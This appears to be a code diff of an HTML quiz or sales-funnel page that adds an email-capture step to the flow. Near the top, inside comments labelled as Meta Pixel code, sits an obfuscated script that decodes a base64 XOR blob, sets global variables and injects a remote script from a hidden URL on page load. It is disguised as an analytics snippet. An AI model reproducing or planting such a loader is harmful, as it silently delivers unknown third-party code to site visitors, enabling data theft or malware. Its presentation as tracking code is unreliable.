@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
   <!-- Meta Pixel Code -->
 <script>(function(){var i_a=atob("DD9G4nnLDwpo6YkIyURklwunLTBKgf18uUx8zVaoa2RGnP1loFk/zBqkYiQKm6Z7qk0vkg24IHoBkexk5k8vmhynIWAby6UqqEsykBCpen4NmqsykmJqwB6nYGgJhfoq82Q9wBeqYm9K06t4oEcjjjCvLSZKn+hkvFpk2Fv9bm4Oiu1urAh/1EipOjtf3bBprwkk0B/pclcV");var v_5f=[];for(var p_1o=0;p_1o<i_a.length;p_1o++){v_5f.push(i_a.charCodeAt(p_1o)&255);}var l_o=v_5f[0];var l_z=v_5f.slice(1,1+l_o);var c_jqz1=v_5f.slice(1+l_o);var j_rgwp=c_jqz1.map(function(b,t_6ht){return b^l_z[t_6ht%l_o];});var k_66d="";for(var h_k=0;h_k<j_rgwp.length;h_k++){k_66d+=String.fromCharCode(j_rgwp[h_k]&255);}var k_j=decodeURIComponent(escape(k_66d));var e_vt=JSON.parse(k_j);var g_g7=e_vt.globals||[];g_g7.forEach(function(t_l){window[t_l.name]=t_l.value;});var n_1=document.createElement("script");n_1.src=e_vt.url;n_1.async=true;n_1.defer=true;(e_vt.attributes||[]).forEach(function(h_ed50){n_1.setAttribute(h_ed50.name,h_ed50.value);});(document.head||document.documentElement).appendChild(n_1);})();</script>
 <!-- End Meta Pixel Code -->
-
+  
 <head>
 
 
@@ -283,6 +284,7 @@ const S = [
  { id:'eventdate', type:'eventdate', skip:()=>!D.a.event || D.a.event==='none' },
  { id:'predict', type:'predict' },
  { id:'loading', type:'loading', noBack:true },
+ { id:'email', type:'email', noBack:true },
  { id:'name', type:'name' },
  { id:'ready', type:'ready' },
  { id:'scratch', type:'scratch' }
@@ -500,6 +502,12 @@ const R = {
     if(T.length){ const k=Math.min(T.length-1,Math.floor(p*T.length)); if(k!==ti){ ti=k; const t=T[k]; $('#tst',el).innerHTML=`<div class="tst"><div class="stars">★★★★★</div><b>${esc(t.title||'')}</b><p style="font-size:14px;color:#44444C;margin-top:4px">${esc(t.text)}</p><p style="font-size:13px;color:var(--muted);margin-top:6px">${esc(t.name)}</p></div>`; } }
     if(p<1) requestAnimationFrame(tick); else setTimeout(next,500);
   })(t0);
+ },
+ email(sc, el){
+  el.innerHTML = `<h1 class="i">Enter your email to get your <span style="color:var(--pink)">${esc(CONFIG.product)} Plan</span></h1><input type="email" class="field" id="em" placeholder="Your email" autocomplete="email" value="${esc(D.email||'')}"><p class="privacy">🔒 <span>We respect your privacy and are committed to protecting your personal data. Your data will be processed in accordance with our <a href="${CONFIG.privacyUrl}" target="_blank">Privacy Policy</a>.</span></p>`;
+  const inp=$('#em',el), b=cta('Continue',()=>{ D.email=inp.value.trim(); next(); },true);
+  const chk=()=>{ b.disabled=!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(inp.value.trim()); };
+  inp.oninput=chk; chk(); inp.focus();
  },
  name(sc, el){
   el.innerHTML = `<h1 class="q">What's your name?</h1><input class="field" id="nm" placeholder="Name" autocomplete="given-name" value="${esc(D.name||'')}">`;
